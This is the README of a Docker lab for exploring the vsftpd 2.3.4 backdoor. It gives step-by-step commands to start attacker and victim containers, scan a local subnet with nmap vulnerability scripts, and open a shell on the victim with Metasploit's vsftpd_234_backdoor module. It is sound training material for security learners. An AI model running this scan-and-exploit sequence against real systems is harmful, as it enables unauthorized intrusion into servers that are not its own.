# Exploit vsftp2.3.4 backdoor

## Description

This is a repository that uses Docker to set up a fully functional lab to explore the vsftpd backdoor vulnerability using Metasploit.

## Usage

1. clone repo.

   ```bash
   git clone git@github.com:Branyoe/exploits-lab.git
   ```
2. Run compose app.

   ```bash
   docker compose up -d
   ```
3. Acces to attacked-container teminal.

   ```bash
   docker exec -it attacked-container sh
   ```
4. Execute the vsftpd service in the terminal of the attacked container.

   ```bash
   start-vsftpd
   ```
5. In another terminal instance, access the terminal of the attacker container.

   ```bash
   docker exec -it attacker-container bash
   ```
6. See attacker-container IP.

   ```bash
   ifconfig
   ```
7. Scan your LAN using Nmap and input the first three IP segments, followed by '1-10' for the last segment. For example, if your IP is 192.168.0.3, type 192.168.0.**1-10**.

   ```bash
   nmap --script vuln 192.168.0.1-10
   ```
8. This identifies vulnerable ports on all specified hosts. It returns the IP addresses of hosts with the vsftpd vulnerability.![1714065527700](image/README/1714065527700.png)
9. The found IP will bee attacked using metasploit.
10. Init msfconsole.

    ```bash
    msfconsole
    ```
11. Search a exploit.

    ```bash
    search vsftpd
    ```
12. use this attack.
    ![1714065970061](image/README/1714065970061.png)

    ```bash
    user exploit/unix/ftp/vsftpd_234_backdoor
    ```
13. set host to attack.

    ```bash
    set rhost <attacked-container-IP>
    ```
14. Run attack.

    ```bash
    run
    ```
15. If everything is successful you should see this.
16. Before this you should exec commands in attacked-container.
    ![1714066256174](image/README/1714066256174.png)
